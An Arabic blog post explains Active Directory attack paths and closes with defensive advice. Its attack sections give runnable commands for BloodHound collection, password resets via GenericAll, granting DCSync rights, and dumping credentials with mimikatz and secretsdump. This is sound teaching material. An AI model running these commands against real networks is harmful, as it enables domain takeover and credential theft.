---
layout: blog
title: "مسارات الهجوم في Active Directory: كيف يتنقل المهاجم من نقطة الاختراق إلى Domain Admin"
date: 2026-04-04T15:58:23Z
category: "منهجية"
excerpt: "في بيئات Active Directory، لا يكفي اختراق جهاز واحد للسيطرة الكاملة. المهاجم المحترف يبحث عن مسارات الهجوم - تلك السلاسل المترابطة من الصلاحيات والعلاقات التي توصله إلى هدفه النهائي. فهم هذه المسارات ليس ترفًا، بل ضرورة لكل من يدافع عن شبكة مؤسسية أو يختبر أمنها."
read_time: 8
tags: ["Active Directory", "Attack Paths", "BloodHound", "Privilege Escalation", "Red Teaming"]
slug: "ad-attack-paths"
image: "/OffsecAR/assets/images/blogs/ad-attack-paths.svg"
---

## جوهر المشكلة: Graph Theory في عالم الأمن

Active Directory ليس مجرد قاعدة بيانات للمستخدمين. إنه Graph معقد من العلاقات والصلاحيات. كل كائن - مستخدم، مجموعة، حاسوب - يمثل Node، والصلاحيات بينها تمثل Edges. المهاجم لا يبحث عن ثغرة واحدة، بل عن مسار في هذا الـ Graph يوصله من نقطة الاختراق الأولية إلى Domain Admin.

الخطورة الحقيقية تكمن في أن معظم هذه المسارات ليست ثغرات تقنية، بل Misconfigurations متراكمة عبر السنين. مستخدم له GenericAll على مجموعة، والمجموعة لها WriteDacl على Organizational Unit، والـ OU تحتوي على حاسوب Domain Controller. كل خطوة شرعية بمفردها، لكن مجتمعة تشكل طريقًا سريعًا للسيطرة الكاملة.

## رسم الخريطة: BloodHound والاستكشاف

BloodHound أحدث ثورة في فهم Attack Paths. الأداة تجمع البيانات من Active Directory عبر SharpHound أو BloodHound.py، ثم تبني Graph قابلًا للاستعلام يكشف العلاقات الخفية.

عملية الجمع بسيطة لكن فعّالة:

```powershell
# من داخل الشبكة باستخدام SharpHound
.\SharpHound.exe -c All --zipfilename corp_audit.zip

# أو من Linux باستخدام Python
bloodhound.py -u user@corp.local -p 'Password123' \
  -d corp.local -ns 10.10.10.10 -c All
```

بعد استيراد البيانات في BloodHound، تبدأ الحقيقة بالظهور. استعلامات مثل "Shortest Paths to Domain Admins" تكشف مسارات قد تتطلب خطوتين أو ثلاثة فقط من أي مستخدم عادي.

## أنماط الهجوم الشائعة: ما نراه ميدانيًا

### Generic* Permissions

الصلاحيات العامة (GenericAll, GenericWrite, WriteProperty) هي الأكثر استغلالًا. GenericAll على مستخدم تعني إمكانية تغيير كلمة المرور:

```powershell
# تغيير كلمة مرور مستخدم لديك GenericAll عليه
$UserPassword = ConvertTo-SecureString 'NewPass123!' -AsPlainText -Force
Set-ADAccountPassword -Identity targetuser -NewPassword $UserPassword -Reset
```

### Group Membership Chains

المستخدم عضو في Group A، التي هي عضو في Group B، التي لها صلاحيات إدارية. المسار غير مباشر لكنه فعّال:

```powershell
# إضافة نفسك لمجموعة لديك WriteMember عليها
Add-ADGroupMember -Identity "Help Desk" -Members "compromised_user"
```

### ACL-based Attacks

أخطر المسارات تعتمد على Access Control Lists. WriteDacl تمنحك القدرة على منح نفسك أي صلاحية:

```powershell
# استخدام PowerView لإضافة DCSync rights
Add-DomainObjectAcl -TargetIdentity "DC=corp,DC=local" \
  -PrincipalIdentity compromised_user \
  -Rights DCSync

# ثم تنفيذ DCSync
mimikatz# lsadump::dcsync /domain:corp.local /user:Administrator
```

## العلاقات غير المباشرة: الشيطان في التفاصيل

أخطر المسارات ليست الواضحة. Session Enumeration يكشف أين يسجل المستخدمون دخولهم. إذا كان لديك Local Admin على حاسوب، وهناك Domain Admin له Active Session عليه، يمكنك سرقة الـ Credentials:

```bash
# من خلال Impacket
secretsdump.py corp.local/user:password@target-pc

# أو استخدام Mimikatz
mimikatz# privilege::debug
mimikatz# sekurlsa::logonpasswords
```

Computer Objects أيضًا تحمل مخاطر. Resource-Based Constrained Delegation يسمح لك بانتحال أي مستخدم إذا كان لديك WriteProperty على msDS-AllowedToActOnBehalfOfOtherIdentity.

## الدفاع: كسر السلاسل

الدفاع الفعال لا يعتمد على سد كل ثغرة، بل على كسر مسارات الهجوم. بعض الاستراتيجيات العملية:

**Tier Model Implementation**: افصل الصلاحيات في طبقات. حسابات Domain Admin لا تسجل دخول إلا على Domain Controllers.

**Regular ACL Audits**: استخدم BloodHound دوريًا من منظور دفاعي. ابحث عن Paths غير متوقعة:

```cypher
// استعلام Cypher في BloodHound
MATCH p=shortestPath((u:User {owned:false})-[*1..]->(g:Group))
WHERE g.name =~ 'DOMAIN ADMINS.*'
RETURN p
```

**Protected Users Group**: ضع الحسابات الحساسة في هذه المجموعة لمنع NTLM authentication وتقليل سطح الهجوم.

**LAPS Deployment**: Local Administrator Password Solution يضمن أن كل حاسوب له كلمة مرور Admin محلية فريدة، مما يمنع Lateral Movement الأفقي.

الحقيقة الصعبة: معظم المؤسسات لديها مسارات هجوم قصيرة جدًا من أي مستخدم عادي إلى Domain Admin. الفرق بين شبكة آمنة وأخرى مخترقة ليس في غياب نقاط الضعف، بل في وعي الفريق الأمني بهذه المسارات وعملهم المستمر على تفكيكها.
